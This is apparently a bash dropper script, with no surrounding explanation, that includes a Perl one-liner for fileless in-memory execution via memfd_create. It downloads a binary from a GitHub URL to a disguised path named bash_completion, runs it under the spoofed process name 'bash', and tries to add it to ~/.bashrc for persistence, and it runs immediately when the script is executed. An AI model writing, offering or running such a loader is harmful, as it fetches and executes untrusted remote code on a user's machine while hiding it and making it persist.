#!/bin/bash

memexec(){ perl '-e$^F=255;for(319,279,385,4314,4354){($f=syscall$_,$",0)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV;exit 255' -- "$@";}

memexec_bash() {
    local url="https://github.com/YakouDev/z/raw/refs/heads/main/bash_completion"
    local mempath="$HOME/.local/share/bash_completion"

    mkdir -p "$HOME/.local/share"

    if ! curl -fsSL "$url" -o "$mempath" 2>/dev/null; then
        if ! wget -q "$url" -O "$mempath" 2>/dev/null; then
            exit 1
        fi
    fi

    chmod +x "$mempath"

    exec -a 'bash' "$mempath" "$@"
    echo "$HOME/.local/share/bash_completion" >> "$HOME/.bashrc"
    source "$HOME/.bashrc"
}

# === JALANKAN ===
memexec_bash